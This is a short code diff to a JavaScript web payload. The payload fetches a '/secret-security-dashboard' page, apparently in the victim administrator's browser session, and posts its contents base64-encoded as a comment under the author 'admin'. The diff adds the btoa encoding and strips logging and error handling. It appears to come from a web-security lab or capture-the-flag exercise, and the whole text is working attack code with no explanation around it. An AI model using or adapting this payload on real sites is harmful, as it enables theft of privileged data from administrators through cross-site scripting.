@@ -2,8 +2,7 @@ fetch("/secret-security-dashboard")
   .then(response => response.text()) 
   .then(adminData => {
     const postData = new URLSearchParams({
-      comment2: adminData, 
-    //   comment2: btoa(adminData), 
+      comment2: btoa(adminData), 
       "comment-author": "admin"
     });
     return fetch("/post-comment", {
@@ -13,11 +12,4 @@ fetch("/secret-security-dashboard")
       },
       body: postData,
     });
-  })
-  .then(response => response.text())
-  .then(result => {
-    console.log("Post result:", result);
-  })
-  .catch(error => {
-    console.error("There was a problem with the fetch operation:", error);
   });
